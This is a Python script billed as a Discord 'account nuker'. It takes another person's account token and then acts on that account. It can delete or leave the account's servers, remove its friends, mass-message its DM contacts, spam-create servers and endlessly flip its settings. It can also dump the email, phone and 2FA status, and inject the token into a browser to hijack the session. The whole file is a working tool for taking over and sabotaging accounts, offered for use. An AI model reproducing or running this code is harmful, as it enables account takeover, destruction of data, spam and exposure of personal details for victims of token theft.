# Account nuker fixed by https://github.com/iiLeafy
import threading, requests, discord, random, time, os

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

init(convert=True)
guildsIds = []
friendsIds = []
channelIds = []
clear = lambda: os.system('cls')
clear()

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
 
        for f in self.user.friends:
            friendsIds.append(f.id)

        for c in self.private_channels:
            channelIds.append(c.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            print(f"[{Fore.RED}-{Fore.RESET}] Invalid token", e)
            input("Press any key to exit..."); exit(0)

def tokenLogin(token):
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')

def tokenInfo(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]       {userName}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}

            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}

            ''')
            input()

def tokenFuck(token):
    headers = {'Authorization': token}
    gdel = input(f'Would you like to delete all guilds on this account. y/n [No Capitals] > ')
    fdel = input('Would you like to remove all friends on this account. y/n [No Capitals] > ')
    sendall = input('Would you like to send a dm to all recent dms on this account. y/n [No Capitals] > ')
    fremove = input('Would you like to remove all recent dms on this account. y/n [No Capitals] > ')
    gleave = input('Would you like to leave all guilds on this account. y/n [No Capitals] > ')
    gcreate = input('Would you like to spam create guilds on this account.  y/n [No Capitals] > ')
    dlmode = input('Would you like to spam change through light and dark mode. y/n [No Capitals] > ')
    langspam = input('Would you like to spam change the user\'s language. y/n [No Capitals] > ')
    print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")

    if sendall == 'y':
        try:
            sendmessage = input('What do you want to send to everyone on the recent dms. > ')
            for id in channelIds:
                requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={"content": f"{sendmessage}"})
                print(f'Sent message to private channel ID of {id}')
        except Exception as e:
            print(f'Error detected, ignoring. {e}')

    if gleave == 'y':
        try:
            for guild in guildsIds:
                requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
                print(f'Left guild {guild}')
        except Exception as e:
            print(f'Error detected, ignoring. {e}')

    if fdel == 'y':
        try:
            for friend in friendsIds:
                requests.delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers)
                print(f'Removed friend {friend}')
        except Exception as e:
            print(f'Error detected, ignoring. {e}')

    if fremove == 'y':
        try:
            for id in channelIds:
                requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
                print(f'Removed private channel ID {id}')
        except Exception as e:
            print(f'Error detected, ignoring. {e}')

    if gdel == 'y':
        try:
            for guild in guildsIds:
                requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
                print(f'Deleted guild {guild}')
        except Exception as e:
            print(f'Error detected, ignoring. {e}')

    if gcreate == 'y':
        try:
            gname = input('What would you like the spammed server name be. > ')
            gserv = input('How many servers would you like to be made. [max is 100 by discord]')
            for i in range(int(gserv)):
                payload = {'name': f'{gname}', 'region': 'europe', 'icon': None, 'channels': None}
                requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
                print(f'Server {gname} made. Count: {i}')
        except Exception as e:
            print(f'Error detected, ignoring. {e}')

    if dlmode == 'y':
        try:
            modes = cycle(["light", "dark"])
        except Exception as e:
            print(f'Error detected, ignoring. {e}')

    if langspam == 'y':
        try:
            while True:
                setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
        except Exception as e:
            print(f'Error detected, ignoring. {e}')

    time.sleep(9999)

def getBanner():
    banner = f'''
                [{Fore.RED}1{Fore.RESET}] Token fuck the account
                [{Fore.RED}2{Fore.RESET}] Grab info about the account
                [{Fore.RED}3{Fore.RESET}] Log into a token

    '''.replace('░', f'{Fore.RED}░{Fore.RESET}')
    return banner

def startMenu():
    print(getBanner())
    print(f'[{Fore.RED}>{Fore.RESET}] Your choice', end=''); choice = str(input('  :  '))

    if choice == '1':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        print(f'[{Fore.RED}>{Fore.RESET}] Threads amount (number)', end=''); threads = input('  :  ')
        Login().run(token)
        if threading.active_count() < int(threads):
            t = threading.Thread(target=tokenFuck, args=(token, ))
            t.start()

    elif choice == '2':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        tokenInfo(token)
    
    elif choice == '3':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        tokenLogin(token)

    elif choice.isdigit() == False:
        clear()
        startMenu()

    else:
        clear()
        startMenu()
        
if __name__ == '__main__':
    startMenu()
